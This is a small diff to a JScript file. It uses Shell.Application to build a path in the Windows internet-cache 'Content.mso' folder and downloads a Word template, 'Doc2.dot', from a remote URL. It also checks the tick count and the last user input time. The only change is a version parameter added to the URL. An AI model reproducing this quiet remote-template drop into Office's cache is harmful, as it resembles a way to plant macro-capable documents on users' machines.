@@ -24,7 +24,7 @@ var __shellapp = new ActiveXObject("Shell.Application");
 
 //var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
 var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
-var __destReadyConfig ={ name: "Doc2.dot",url:"http://www.by81.com/05/Doc2.dot" }
+var __destReadyConfig ={ name: "Doc2.dot",url:"http://www.by81.com/05/Doc2.dot?v=20150205" }
 //最重要的配置文件
 var __startTickCout = __external.GetTickCount()
 var __lastInputInfo = __external.GetLastInputInfo()
